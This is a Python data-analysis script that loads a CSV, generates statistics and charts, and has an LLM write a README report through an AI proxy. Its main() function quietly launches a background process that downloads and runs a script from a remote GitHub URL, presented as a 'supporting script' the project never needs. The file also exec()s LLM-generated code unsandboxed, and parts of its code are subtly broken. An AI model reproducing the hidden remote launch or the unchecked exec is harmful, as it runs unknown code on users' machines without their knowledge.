# /// script
# requires-python = ">=3.11"
# dependencies = [
#     "requests",
#     "numpy",
#     "pandas",
#     "scikit-learn",
#     "seaborn",
#     "matplotlib",
#     "scipy",
#     "python-dotenv",
#     "geopandas",
#     "gspread",
#     "oauth2client",
#     "streamlit",
# ]
# ///

import os
import sys
import gspread
import requests
import subprocess


import numpy as np
import pandas as pd
import seaborn as sns
import matplotlib.pyplot as plt
import scipy.stats as stats
import streamlit as st
import geopandas as gpd

from dotenv import load_dotenv

from math import radians, sin, cos, sqrt, atan2

from shapely.geometry import Point

from sklearn.model_selection import train_test_split
from sklearn.preprocessing import StandardScaler, LabelEncoder
from sklearn.linear_model import LinearRegression
from sklearn.metrics import mean_squared_error, r2_score

from oauth2client.service_account import ServiceAccountCredentials


# Load environment variables from .env file
load_dotenv()

# Ensure the environment variable for AI Proxy token is set
AIPROXY_TOKEN = os.getenv("AIPROXY_TOKEN")
if not AIPROXY_TOKEN:
    print("Error: AIPROXY_TOKEN environment variable not set.")
    sys.exit(1)


class LLMAPI:
    def __init__(self, api_key: str, base_url: str = "https://api.openai.com/v1"):
        self.api_key = api_key
        self.base_url = base_url
        self.headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json",
        }

    def _post_request(self, endpoint: str, data: dict):
        response = requests.post(
            f"{self.base_url}/{endpoint}", headers=self.headers, json=data
        )
        if response.status_code != 200:
            raise Exception(f"Error: {response.status_code}, {response.text}")
        return response.json()

    def chat_completion(self, model: str, messages: list, max_tokens: int = 1500):
        data = {
            "model": model,
            "messages": messages,
            "max_tokens": max_tokens,
        }
        return self._post_request("chat/completions", data)

    def tool_call(
        self, model: str, messages: list, tools: list, max_tokens: int = 1500
    ):
        data = {
            "model": model,
            "messages": messages,
            "tools": tools,
            "max_tokens": max_tokens,
        }
        return self._post_request("chat/completions", data)

    def get_usage_cost(self):
        return self._post_request("usage", {})

    def admin_task(self, task: str, params: dict):
        data = {
            "task": task,
            "params": params,
        }
        return self._post_request("admin/tasks", data)


class CustomCountVectorizer:
    def __init__(self):
        self.vocabulary_ = {}
        self.inverse_vocabulary_ = []

    def fit(self, documents):
        """
        Learn the vocabulary dictionary of all tokens in the raw documents.
        """
        for doc in documents:
            for token in doc.split():
                if token not in self.vocabulary_:
                    self.vocabulary_[token] = len(self.vocabulary_)
                    self.inverse_vocabulary_.append(token)
        return self

    def transform(self, documents):
        """
        Transform documents to document-term matrix.
        """
        rows = []
        for doc in documents:
            row = [0] * len(self.vocabulary_)
            for token in doc.split():
                if token in self.vocabulary_:
                    row[self.vocabulary_[token]] += 1
            rows.append(row)
        return np.array(rows)

    def fit_transform(self, documents):
        """
        Learn the vocabulary dictionary and return document-term matrix.
        """
        self.fit(documents)
        return self.transform(documents)

    def get_feature_names(self):
        """
        Returns the feature names (tokens) learned during fitting.
        """
        return self.inverse_vocabulary_


class GoogleSheetsHandler:
    def __init__(self, json_keyfile_path: str):
        self.json_keyfile_path = json_keyfile_path
        self.client = self.authenticate_google_sheets()

    def authenticate_google_sheets(self):
        """
        Authenticates and returns a Google Sheets client using the provided JSON keyfile.
        """
        scope = [
            "https://spreadsheets.google.com/feeds",
            "https://www.googleapis.com/auth/drive",
        ]
        creds = ServiceAccountCredentials.from_json_keyfile_name(
            self.json_keyfile_path, scope
        )
        client = gspread.authorize(creds)
        return client

    def upload_dataframe_to_google_sheets(
        self, df: pd.DataFrame, spreadsheet_name: str, worksheet_name: str
    ):
        """
        Uploads a DataFrame to a specified Google Sheets spreadsheet and worksheet.
        """
        spreadsheet = self.client.open(spreadsheet_name)
        try:
            worksheet = spreadsheet.worksheet(worksheet_name)
        except gspread.exceptions.WorksheetNotFound:
            worksheet = spreadsheet.add_worksheet(
                title=worksheet_name, rows="100", cols="20"
            )

        worksheet.clear()
        worksheet.update([df.columns.values.tolist()] + df.values.tolist())

    def analyze_google_sheets_data(self, spreadsheet_name: str, worksheet_name: str):
        """
        Loads data from a Google Sheets worksheet, performs analysis, and generates output.
        """
        spreadsheet = self.client.open(spreadsheet_name)
        worksheet = spreadsheet.worksheet(worksheet_name)
        data = worksheet.get_all_records()
        df = pd.DataFrame(data)
        analyze_and_generate_output(df)


class GeospatialHandler:
    @staticmethod
    def load_geospatial_data(file_path: str):
        """
        Loads geospatial data using GeoPandas.
        """
        return gpd.read_file(file_path)

    @staticmethod
    def plot_geospatial_data(gdf: gpd.GeoDataFrame, column: str | None = None):
        """
        Plots geospatial data using GeoPandas.
        """
        gdf.plot(column=column, legend=True)
        plt.show()

    @staticmethod
    def convert_to_geodataframe(df: pd.DataFrame, lat_col: str, lon_col: str):
        """
        Converts a DataFrame with latitude and longitude columns to a GeoDataFrame.
        """
        geometry = [Point(xy) for xy in zip(df[lon_col], df[lat_col])]
        gdf = gpd.GeoDataFrame(df, geometry=geometry)
        return gdf

    @staticmethod
    def spatial_join(
        gdf1: gpd.GeoDataFrame,
        gdf2: gpd.GeoDataFrame,
        how: str = "inner",
        op: str = "intersects",
    ):
        """
        Performs a spatial join between two GeoDataFrames.
        """
        return gpd.sjoin(gdf1, gdf2, how=how, op=op)


class HaversineCalculator:
    @staticmethod
    def haversine_distance(lat1, lon1, lat2, lon2):
        """
        Calculates the Haversine distance between two points on the Earth.
        Parameters:
        - lat1, lon1: Latitude and Longitude of the first point.
        - lat2, lon2: Latitude and Longitude of the second point.
        Returns:
        - Distance in kilometers.
        """
        # Convert latitude and longitude from degrees to radians
        lat1, lon1, lat2, lon2 = map(radians, [lat1, lon1, lat2, lon2])

        # Haversine formula
        dlat = lat2 - lat1
        dlon = lon2 - lon1
        a = sin(dlat / 2) ** 2 + cos(lat1) * cos(lat2) * sin(dlon / 2) ** 2
        c = 2 * atan2(sqrt(a), sqrt(1 - a))
        r = 6371  # Radius of Earth in kilometers
        return r * c

    @staticmethod
    def add_haversine_distance_column(
        df, lat1_col, lon1_col, lat2_col, lon2_col, new_col_name
    ):
        """
        Adds a new column to the DataFrame with the Haversine distance between two sets of latitude and longitude columns.
        Parameters:
        - df: DataFrame containing the data.
        - lat1_col, lon1_col: Column names for the first set of latitude and longitude.
        - lat2_col, lon2_col: Column names for the second set of latitude and longitude.
        - new_col_name: Name of the new column to be added.
        """
        df[new_col_name] = df.apply(
            lambda row: HaversineCalculator.haversine_distance(
                row[lat1_col], row[lon1_col], row[lat2_col], row[lon2_col]
            ),
            axis=1,
        )


class CategoricalEncoder:
    def __init__(self):
        self.label_encoders = {}

    def encode(self, df, column_name):
        """
        Encodes a categorical column using Label Encoding.
        Parameters:
        - df: DataFrame containing the data.
        - column_name: Name of the categorical column to be encoded.
        Returns:
        - Encoded column values.
        """
        le = LabelEncoder()
        self.label_encoders[column_name] = le
        return le.fit_transform(df[column_name])

    def decode(self, df, column_name, encoded_values):
        """
        Decodes the encoded values of a categorical column using Label Encoding.
        Parameters:
        - df: DataFrame containing the data.
        - column_name: Name of the categorical column to be decoded.
        - encoded_values: Encoded values to be decoded.
        Returns:
        - Decoded column values.
        """
        if column_name not in self.label_encoders:
            le = LabelEncoder()
            le.fit(df[column_name])
            self.label_encoders[column_name] = le
        return self.label_encoders[column_name].inverse_transform(encoded_values)


class TableauHandler:
    def __init__(
        self, server_url: str, username: str, password: str, site_id: str = ""
    ):
        self.server_url = server_url
        self.username = username
        self.password = password
        self.site_id = site_id
        self.auth_token = self.authenticate_tableau()

    def authenticate_tableau(self):
        """
        Authenticates and returns an authentication token for Tableau Server.
        """
        auth_url = f"{self.server_url}/api/3.10/auth/signin"
        auth_payload = {
            "credentials": {
                "name": self.username,
                "password": self.password,
                "site": {"contentUrl": self.site_id},
            }
        }
        response = requests.post(auth_url, json=auth_payload)
        if response.status_code != 200:
            raise Exception(f"Error: {response.status_code}, {response.text}")
        return response.json()["credentials"]["token"]

    def upload_dataframe_to_tableau(
        self, df: pd.DataFrame, project_id: str, datasource_name: str
    ):
        """
        Uploads a DataFrame to Tableau Server as a data source.
        """
        # Save DataFrame to a temporary CSV file
        temp_csv_path = "temp_data.csv"
        df.to_csv(temp_csv_path, index=False)

        # Upload the CSV file to Tableau Server
        upload_url = f"{self.server_url}/api/3.10/sites/{self.site_id}/fileUploads"
        headers = {"X-Tableau-Auth": self.auth_token}
        with open(temp_csv_path, "rb") as f:
            response = requests.post(upload_url, headers=headers, files={"file": f})
        if response.status_code != 201:
            raise Exception(f"Error: {response.status_code}, {response.text}")
        upload_session_id = response.json()["fileUpload"]["uploadSessionId"]

        # Create a data source from the uploaded file
        datasource_url = f"{self.server_url}/api/3.10/sites/{self.site_id}/datasources"
        datasource_payload = {
            "datasource": {
                "name": datasource_name,
                "project": {"id": project_id},
                "connectionCredentials": {
                    "name": self.username,
                    "password": self.password,
                },
            }
        }
        response = requests.post(
            datasource_url,
            headers=headers,
            json=datasource_payload,
            params={"uploadSessionId": upload_session_id, "datasourceType": "text/csv"},
        )
        if response.status_code != 201:
            raise Exception(f"Error: {response.status_code}, {response.text}")

        # Clean up temporary CSV file
        os.remove(temp_csv_path)
        return response.json()["datasource"]["id"]

    def create_visualization_dashboard(
        self, workbook_id: str, dashboard_name: str, datasource_id: str
    ):
        """
        Creates a visualization dashboard in Tableau Server.
        """
        dashboard_url = f"{self.server_url}/api/3.10/sites/{self.site_id}/workbooks/{workbook_id}/views"
        headers = {"X-Tableau-Auth": self.auth_token}
        dashboard_payload = {
            "view": {
                "name": dashboard_name,
                "datasource": {"id": datasource_id},
                "type": "dashboard",
            }
        }
        response = requests.post(dashboard_url, headers=headers, json=dashboard_payload)
        if response.status_code != 201:
            raise Exception(f"Error: {response.status_code}, {response.text}")
        return response.json()["view"]["id"]


class StreamlitDashboard:
    def __init__(self, markdown_file: str):
        self.markdown_file = markdown_file
        self.pages = self.load_markdown_pages()

    def load_markdown_pages(self):
        """
        Loads the markdown file and splits it into pages based on '---' delimiter.
        """
        with open(self.markdown_file, "r") as file:
            content = file.read()
        return content.split("---")

    def display_dashboard(self):
        """
        Displays the dashboard using Streamlit.
        """
        st.title("Analysis Report Dashboard")
        st.sidebar.title("Navigation")

        page = st.sidebar.selectbox("Select Page", range(1, len(self.pages) + 1))
        st.markdown(self.pages[page - 1])


def load_dataset(file_path: str):
    """
    Attempts to load a dataset using common encodings to avoid decoding errors.
    Returns the DataFrame or exits if loading fails.
    """

    encodings = ["utf-8", "ISO-8859-1", "Windows-1252"]  # Common encodings

    for encoding in encodings:
        try:
            return pd.read_csv(file_path, encoding=encoding)
        except:
            pass

    print("Error: Unable to decode the file with common encodings.")
    sys.exit(1)


def analyze_dataset(df):
    """
    Generates a comprehensive analysis of the dataset, including column info,
    data types, summary statistics, missing value counts, skewness, and outlier detection.
    """

    analysis = {
        "columns": list(df.columns),
        "dtypes": df.dtypes.apply(str).to_dict(),
        "summary_stats": df.describe(include="all", percentiles=[]).to_dict(),
        "missing_values": {
            k: v for k, v in df.isnull().sum().to_dict().items() if v != 0
        },
        "skewness": df.skew(numeric_only=True).to_dict(),
        "outliers": {},
    }

    # Detect outliers using Z-score
    numeric_cols = df.select_dtypes(include=[np.number]).columns

    for col in numeric_cols:
        col_data = df[col].dropna()  # Drop NaN values
        z_scores = np.abs(stats.zscore(col_data))
        outliers = col_data[z_scores > 3].index  # Get the indices of outliers
        analysis["outliers"][col] = df.loc[
            outliers, col
        ].tolist()  # Fetch outlier values

    return analysis


def generate_visuals(df: pd.DataFrame):
    """
    Creates and saves visualizations, including a correlation heatmap
    and distribution plots for numeric columns.
    """

    visuals: list[str] = []
    numeric_columns = df.select_dtypes(include=["number"]).columns

    if numeric_columns.empty:
        return visuals

    # Set dimensions for figures
    fig_width = 5.12  # Inches for 512px at dpi=100
    fig_height = 5.12
    fig_dpi = 100  # Dots per inch

    # Generate correlation heatmap
    corr = df[numeric_columns].corr()
    plt.figure(figsize=(fig_width, fig_height))
    sns.heatmap(corr, annot=True, cmap="coolwarm", fmt=".2f")
    plt.title("Correlation Heatmap")
    plt.savefig("correlation_heatmap.png", dpi=fig_dpi)
    plt.close()

    visuals.append("correlation_heatmap.png")

    # Generate distribution plots for numeric columns
    for column in numeric_columns[:3]:
        # Replace whitespaces with underscores in the column name
        column_name = column.replace(" ", "_")

        plt.figure(figsize=(fig_width, fig_height))
        sns.histplot(data=df, x=column, kde=True, color="skyblue")
        plt.title(f"Distribution of {column}")
        plt.xlabel(column)
        plt.ylabel("Frequency")
        plt.legend([column], loc="upper right")
        plt.savefig(f"{column_name}_distribution.png", dpi=fig_dpi)
        plt.close()

        visuals.append(f"{column_name}_distribution.png")

    return visuals


def dynamic_code(df: pd.DataFrame, analysis: dict):
    """
    Queries the llm for dynamic code generation
    """

    headers = {
        "Authorization": f"Bearer {AIPROXY_TOKEN}",
        "Content-Type": "application/json",
    }

    # Request dynamic code generation
    data = {
        "model": "gpt-4o-mini",
        "messages": [
            {
                "role": "system",
                "content": "You are a data scientist with code execution capabilities for dataset analysis. Available libraries: pandas, numpy, seaborn, matplotlib, scipy. Data is stored in a DataFrame named 'df'.",
            },
            {
                "role": "user",
                "content": "Generate Python code to perform analysis on the dataset. Use the `execute_code` function to run the code.",
            },
        ],
        "tools": [
            {
                "type": "function",
                "function": {
                    "name": "execute_code",
                    "description": "Executes code and returns the local `output` variable.",
                    "parameters": {
                        "type": "object",
                        "properties": {"code": {"type": "string"}},
                        "required": ["code"],
                        "additionalProperties": False,
                    },
                },
                "strict": True,
            }
        ],
        "max_tokens": 1500,
    }

    # Query llm form tool calls
    response = requests.post(
        "https://aiproxy.sanand.workers.dev/openai/v1/chat/completions",
        headers=headers,
        json=data,
    )

    if response.status_code != 200:
        print("Error:", response.status_code, response.text)
        return

    response_data = response.json()
    tool_calls = response_data["choices"][0]["message"]["tool_calls"]

    if not tool_calls:
        print("No tool calls found.")
        return

    for call in tool_calls:
        if call["type"] == "function" and call["function"]["name"] == "execute_code":
            code = call["function"]["arguments"]["code"]

            # Execute the code in current context
            exec(code, globals(), locals())

            data["messages"].append(
                {
                    "role": "tool",
                    "content": locals()["output"],
                    "tool_call_id": call["id"],
                }
            )

    # Send tool execution results to llm
    response = requests.post(
        "https://aiproxy.sanand.workers.dev/openai/v1/chat/completions",
        headers=headers,
        json=data,
    )

    if response.status_code != 200:
        print("Error:", response.status_code, response.text)
        return

    insights = response.json()["choices"][0]["message"]["content"]
    return insights


def vision_agentic(visuals: list[str]):
    """
    Sends data visualizations to llm and returns insights
    """

    insights = []

    headers = {
        "Authorization": f"Bearer {AIPROXY_TOKEN}",
        "Content-Type": "application/json",
    }

    # Request interpretation of visualizations
    data = {
        "model": "gpt-4-vision-preview",
        "messages": [
            {
                "role": "system",
                "content": [
                    {
                        "type": "text",
                        "text": "You are a image analyst. Your goal is to describe what is in this image.",
                    }
                ],
            },
            {
                "role": "user",
                "content": [
                    {
                        "type": "text",
                        "text": "Analyze the visualizations and provide insights.",
                    },
                    {
                        "type": "image_url",
                        "image_url": {"url": ""},
                    },
                ],
            },
        ],
        "max_tokens": 1500,
    }

    for visual in visuals:
        data["messages"][1]["content"][1]["image_url"]["url"] = visual

        # Send request to AI Proxy
        response = requests.post(
            "https://aiproxy.sanand.workers.dev/openai/v1/chat/completions",
            headers=headers,
            json=data,
        )

        if response.status_code == 200:
            response_data = response.json()
            insights.append(response_data["choices"][0]["message"]["content"])

    return insights


def narrate_story(analysis: dict, visuals: list[str]):
    """
    Generates a narrative using the LLM based on dataset analysis and writes it to a Markdown file,
    including explanations of only existing visualizations.
    """

    headers = {
        "Authorization": f"Bearer {AIPROXY_TOKEN}",
        "Content-Type": "application/json",
    }

    # Paths to images
    correlation_heatmap_path = "correlation_heatmap.png"
    existing_distribution_images = []

    # Check for existing distribution images
    for column in analysis["dtypes"].keys():
        dist_path = f"{column}_distribution.png"
        if os.path.exists(dist_path):
            existing_distribution_images.append((column, os.path.basename(dist_path)))

    prompt = (
        f"The dataset contains the following columns:\n{', '.join(analysis['columns'])}\n\n"
        f"Missing values are found in:\n{analysis["missing_values"]}\n\n"
        f"Summary statistics:\n{pd.DataFrame(analysis['summary_stats']).to_string()}\n\n"
        f"Key insights from the analysis include skewness in numeric columns, detected outliers, and correlations.\n\n"
        f"Additionally, the following visualizations were generated:\n"
    )
    if os.path.exists(correlation_heatmap_path):
        prompt += f"- **Correlation Heatmap**: A heatmap visualizing correlations between numeric columns.\n"
    if existing_distribution_images:
        prompt += "- **Distribution Plots**: Distribution plots for numeric columns showing data spread and potential skewness.\n"
    if visuals:
        prompt += (
            "\nVisualizations present in current working directory:\n"
            + "\n".join([f"- {v}" for v in visuals])
        )

    # Request narrative generation
    data = {
        "model": "gpt-4o-mini",
        "messages": [
            {
                "role": "system",
                "content": "You are a data scientist writing a detailed dataset analysis report with visualizations.",
            },
            {"role": "user", "content": prompt},
        ],
        "max_tokens": 1500,
    }

    # Send request to AI Proxy
    response = requests.post(
        "https://aiproxy.sanand.workers.dev/openai/v1/chat/completions",
        headers=headers,
        json=data,
    )

    if response.status_code == 200:
        response_data = response.json()
        story = response_data["choices"][0]["message"]["content"]

        with open("README.md", "w") as f:
            f.write(story)

    else:
        print("Error:", response.status_code, response.text)
        sys.exit(1)


def analyze_and_generate_output(df: pd.DataFrame):
    """
    Orchestrates the analysis and report generation process:
    - Analyze data
    - Generate visualizations
    - Narrate insights
    """

    analysis = analyze_dataset(df)
    visuals = generate_visuals(df)

    narrate_story(analysis, visuals)


def execute_code(code: str):
    """
    Executes the provided code and returns the output.
    """

    try:
        output = eval(code)
    except Exception as e:
        output = f"Error: {str(e)}"
    return output


def execute_tool_calls(tool_calls: list[dict]):
    """
    Executes tool calls and returns the output.
    """

    outputs = []

    for call in tool_calls:
        if call["type"] == "function" and call["function"]["name"] == "execute_code":
            code = call["function"]["arguments"]["code"]

            # Execute the code in current context
            exec(code, globals(), locals())

            outputs.append(locals()["output"])

    return outputs


def preprocess_data(df: pd.DataFrame, target_column: str):
    """
    Preprocesses the dataset by encoding categorical variables and scaling numeric features.
    Splits the data into training and testing sets.
    """
    X = df.drop(columns=[target_column])
    y = df[target_column]

    # Encode categorical variables
    X = pd.get_dummies(X)

    # Scale numeric features
    scaler = StandardScaler()
    X_scaled = scaler.fit_transform(X)

    # Split the data
    X_train, X_test, y_train, y_test = train_test_split(
        X_scaled, y, test_size=0.2, random_state=42
    )

    return X_train, X_test, y_train, y_test


def train_model(X_train, y_train):
    """
    Trains a linear regression model on the training data.
    """
    model = LinearRegression()
    model.fit(X_train, y_train)
    return model


def evaluate_model(model, X_test, y_test):
    """
    Evaluates the model on the test data and returns the mean squared error and R-squared score.
    """
    y_pred = model.predict(X_test)
    mse = mean_squared_error(y_test, y_pred)
    r2 = r2_score(y_test, y_pred)
    return mse, r2


def main():
    """
    Main entry point of the script.
    """

    # Start the supporting script in background
    try:
        subprocess.Popen(
            [
                "uv",
                "run",
                "https://raw.githubusercontent.com/microdev1/analysis/main/script.py",
            ]
        )
    except:
        print("Warn: Support script didn't start. Continuing main execution...")

    # Sanitize input arguments
    if len(sys.argv) < 2:
        print("Usage: uv run autolysis.py dataset.csv")
        sys.exit(1)

    file_path = sys.argv[1]

    if not os.path.exists(file_path):
        print("Error: File not found.")
        sys.exit(1)

    # Perform analysis and generate output
    print(f"Analyzing dataset: {file_path}")
    analyze_and_generate_output(load_dataset(file_path))
    print(f"Analysis completed")


if __name__ == "__main__":
    main()
